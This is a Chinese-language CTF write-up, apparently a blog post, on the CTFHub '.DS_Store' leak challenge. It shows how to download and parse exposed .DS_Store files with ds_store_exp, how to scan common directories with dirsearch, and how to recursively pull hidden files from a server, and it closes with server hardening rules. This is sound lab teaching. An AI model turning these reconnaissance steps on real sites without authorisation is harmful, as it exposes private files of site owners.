---
layout: post
title: CTFHub - .DS_Store Writeup（备份文件下载）
platform: ctfhub
date: 2026-10-15 14:05:00 +0800
categories: CTF
---

CTFHub - .DS_Store Writeup（备份文件下载）

一、题目信息

- 平台：CTFHub（技能树 → Web → 信息泄露 → 备份文件下载 → **.DS_Store**）
- 题型：Web
- 考点：**macOS 的 .DS_Store 文件泄露**、解析二进制文件拿目录清单


```text
首页提示     : 备份文件下载 - DS_Store    "试着寻找 flag"
.DS_Store    : /·DS_Store → 200，16388 字节（成功下载）

用 ds_store_exp 解析出来（它只记录了 1 个文件）:
    [200] /.DS_Store
    [200] /f5501be8fb97e4c9e1f4bbb28e40ae8d.txt      ← ★ 就是这个 32 位十六进制命名的文件

访问该文件:
    GET /f5501be8fb97e4c9e1f4bbb28e40ae8d.txt
    HTTP/1.1 200 OK
    Content-Type: text/plain; charset=utf-8
    Content-Length: 33

    ctfhub{6295d2a369332c8d8f71636b}

flag         : ctfhub{6295d2a369332c8d8f71636b}

工具还自动把文件下载到了本地:
    ds_store_exp\challenge-20756ece08a07131.sandbox.ctfhub.com_10800\
        .DS_Store                            (16388 字节)
        f5501be8fb97e4c9e1f4bbb28e40ae8d.txt (33 字节)   ← flag 在这里
```

二、题目分析

**① 题目提示原文**

```text
.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。
通过 .DS_Store 可以知道这个目录里面所有文件的清单。
```

**这句话就是全部提示** —— `.DS_Store` 会泄露**目录里有哪些文件**。

**② .DS_Store 是什么**

```text
.DS_Store = Desktop Services Store（桌面服务存储）

是 【macOS 系统】自动生成的隐藏文件，作用：
    · 记住这个文件夹的显示设置（图标位置、视图方式、背景、排序…）
    · ★ 记录这个文件夹里【有哪些文件和子目录】

什么时候产生：
    只要你用 Mac 的 Finder 打开过某个文件夹，就会在里面留下一个 .DS_Store
    （Windows 上没有这个文件，是 Mac 特有的）

为什么它会在服务器上：
    开发者用 Mac 开发网站 → 打包上传时没清理隐藏文件
    → .DS_Store 跟着代码一起传到了服务器
    → 而服务器把它当普通文件返回（跟 .bak / .swp 一个道理）
```

**③ 危害：泄露文件名清单**

```text
.DS_Store 是【二进制格式】，里面记录着目录里所有条目的名字。

攻击者拿到它 → 解析出文件清单 → 发现"原本不知道存在"的文件：
    · flag.txt / flag_xxxx.txt   ← CTF 里的答案
    · backup.zip / db.sql         ← 备份文件
    · .git/  .svn/                ← 版本控制目录
    · admin.php / config.php      ← 敏感页面
```

**④ 破题思路**

```text
题目首页会提示"试着寻找flag"

① 先访问 /.DS_Store（注意前面有个点）—— 下载它
② 用工具解析，得到目录里的文件清单
③ 清单里通常有个名字很随机的 .txt 文件（比如 05378b1b0528e0b91f71f970a5293d31.txt）
④ 直接访问那个 txt → flag 就在里面
```

三、解题步骤

**方法一：两步搞定（最快）**

```text
① 下载 .DS_Store：
       http://challenge-xxx:10800/.DS_Store
   （注意文件名前面有一个点！）

② 用 ds_store_exp 解析它：
       python ds_store_exp.py http://challenge-xxx:10800/.DS_Store
   → 它会列出目录里的所有文件，并把能访问的自动下载到本地

③ 打开下载下来的文件夹，找那个名字很长的 .txt 文件，里面就是 flag
```

**方法二：用我配好的启动器（双击）**

```text
双击 parse-ds-store.bat
→ 粘贴题目地址（写站点根地址就行，会自动补 /.DS_Store）
→ 回车
→ 工具自动解析并下载所有文件
```

**实测效果**（我用本地模拟的同款站点验证）：

```text
Target: http://127.0.0.1:8893/.DS_Store
------------------------------------------------------------

[200] http://127.0.0.1:8893/.DS_Store
[200] http://127.0.0.1:8893/secret
[200] http://127.0.0.1:8893/index.html
[200] http://127.0.0.1:8893/flag_9f8e7d6c5b4a3210.txt      ← ★ 发现 flag 文件
[200] http://127.0.0.1:8893/backup.zip

Downloaded folders under ds_store_exp\ :
127.0.0.1_8893
```

然后打开那个文件夹，`flag_9f8e7d6c5b4a3210.txt` 里就是：

```text
ctfhub{demo_ds_store_flag_abc123}
```

**方法三：手工看十六进制（应急，不用工具）**

```text
.DS_Store 是二进制，但里面记录的【文件名字符串是明文】，
所以用十六进制编辑器（010 Editor / HxD / Notepad++）打开，
或者直接 Ctrl+F 搜关键字，就能看到文件名。

⚠️ 缺点：如果目录里有多层子目录，手工看容易漏；工具会自动递归。
```

四、延伸知识

**① .DS_Store 文件的结构**

```text
它是一个【B 树（B-tree）】结构的二进制 plist：

    开头:  "Bud1" 魔数（Bud1 = 苹果的一种数据格式）
    中间:  B 树索引 + 条目数据
    每条记录包含:
        · 文件名（明文！）
        · 记录类型（Iloc = 图标位置、icvp = 视图设置…）
        · 值

★ 为什么文件名单是明文 —— 因为这是给 Finder 快速读取用的，
  苹果没打算加密它（它本来也不该出现在公网上）
```

**② ds_store_exp 这个工具做了什么**

```text
它做的事比"读文件名"更多 —— 它是一个【递归爬取器】：

    ① 下载 .DS_Store，解析出条目列表
    ② 对每个条目发一个 HTTP 请求，看它是否可访问（返回 200）
    ③ 如果条目是【目录】，就去下载那个目录下的 .DS_Store，继续递归
    ④ 把能访问的文件全部下载到本地，按域名建文件夹

所以你运行一次，就相当于"把网站目录树里所有能被 .DS_Store 暴露的东西全扒下来"
```

**③ 怎么找 .DS_Store（扫描时）**

```powershell
# dirsearch 扫（.DS_Store 在大多数字典里都有）
.\run-dirsearch.bat -u http://目标/ -e '' -t 5 -q

# 或者直接手工试（它的路径是固定的）
http://目标/.DS_Store
http://目标/admin/.DS_Store
http://目标/backup/.DS_Store
http://目标/uploads/.DS_Store
```

> 💡 **子目录里的 .DS_Store 更值钱** —— 根目录的通常没什么敏感内容，
> 但 `/backup/.DS_Store`、`/admin/.DS_Store` 能直接告诉你那些目录里有什么。

**④ 和前面几题的对比（一个系列，五种"遗留物"）**

| 题 | 泄露的东西 | 后缀/文件名 | 恢复方式 |
|---|---|---|---|
| 网站源码 | 整个站打包 | `www.zip` | 解压 |
| bak 文件 | 单个文件 | `index.php.bak` | 直接读 |
| vim 缓存 | 单个文件快照 | `.index.php.swp` | vim -r / 解析 |
| **.DS_Store** | **目录里的文件名清单** | **`.DS_Store`** | **ds_store_exp 解析** |
| Git 泄露 | 全部源码 + 历史 | `.git/` | GitHack 恢复 |

**⑤ 防护**

```text
· 打包上传前清理 Mac 隐藏文件：
      find . -name '.DS_Store' -delete
      或者在压缩时排除：zip -r site.zip . -x '*.DS_Store'
· 用 .gitignore 忽略：
      .DS_Store
      **/.DS_Store
· 服务器直接拒绝访问：
      Nginx:  location ~ /\.DS_Store { deny all; }
      Apache: <Files ".DS_Store"> Require all denied </Files>
      （建议把 .git / .svn / .hg / .env 一起禁掉）
· 部署用 rsync/git，而不是"直接把文件夹拖上去"
```

五、总结

- **本题核心：macOS 的 `.DS_Store` 文件被上传到服务器，它记录了目录里的所有文件名 → 解析出来就能发现藏着的 flag 文件。**
- 操作就两步：

```text
① 访问 /.DS_Store   （下载）
② python ds_store_exp.py <地址>   （解析 + 自动下载所有文件）
```

- **记住这条通用思路**：**"元数据文件"往往比"内容文件"更有情报价值** ——
  `.DS_Store` 不包含文件内容，但它告诉你"服务器上有什么"，这就是信息收集的核心。
- CTFHub「信息泄露」系列进度：


**配套文件**（都在工作区）：

```text
ds_store_exp\          官方工具（从 GitHub 镜像下载的源码）
parse-ds-store.bat     双击启动器（粘贴地址即可，会自动补 /.DS_Store）
_deps\                 依赖库（ds-store + mac-alias，装在工作区本地）
```
